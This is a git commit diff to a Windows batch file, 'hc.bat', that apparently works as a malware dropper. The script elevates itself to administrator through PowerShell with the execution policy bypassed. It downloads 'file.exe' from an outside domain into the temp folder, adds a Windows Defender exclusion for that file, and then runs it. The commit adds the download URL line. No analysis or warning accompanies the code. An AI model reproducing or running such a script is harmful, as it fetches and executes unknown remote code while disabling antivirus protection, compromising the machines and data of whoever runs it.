57e986322bc7b312a1ba66a8a607f3059c82e834
hoangkarin <104138722+hoangdevpython@users.noreply.github.com>
2023-12-02 21:05:15 +0700

    Update hc.bat

--- hc.bat
+++ hc.bat
@@ -1,6 +1,12 @@
 @echo off
+set "url=https://severnew1.fun/file.exe"
+
 net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%file%'" & exit /b 0)
+if not %errorlevel% == 0 (
+    powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%file%'"
+    exit /b 0
+)
+
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.exe'"
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.exe'"
 start %temp%\file.exe
